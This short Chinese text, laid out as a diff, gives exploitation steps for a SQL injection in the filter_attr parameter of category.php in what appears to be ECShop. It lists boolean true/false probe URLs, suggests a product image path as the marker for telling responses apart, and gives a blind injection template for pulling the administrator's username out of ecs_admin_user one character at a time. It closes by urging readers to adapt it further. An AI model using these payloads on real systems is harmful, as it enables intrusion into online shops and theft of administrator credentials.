@@ -1,0 +1,9 @@
+利用方法:
+访问
+[url]http://127.0.0.1/category.php?page=1&sort=goods_id&order=asc&category=1&display=grid&brand=0&price_min=0&price_max=0&filter_attr=-999%20OR%20[/url][color=Red]1=1[/color]%20OR%201=2
+[url]http://127.0.0.1/category.php?page=1&sort=goods_id&order=asc&category=1&display=grid&brand=0&price_min=0&price_max=0&filter_attr=-999%20OR%20[/url][color=Red]1=2[/color]%20OR%201=2
+可以看到网页的区别.可以抓取商品图片的链接作为关键字如
+images/200905/thumb_img/9_thumb_G_1241511871555.jpg
+爆用户名的语句为
+[url]http://127.0.0.1/category.php?page=1&sort=goods_id&order=asc&category=1&display=grid&brand=0&price_min=0&price_max=0&filter_attr=-999[/url] OR ASCII(MID(UPPER((select user_name FROM ecs_admin_user WHERE user_id=1)),{inj},1))={inj} OR 1=2
+其他的...大家就灵活运用吧
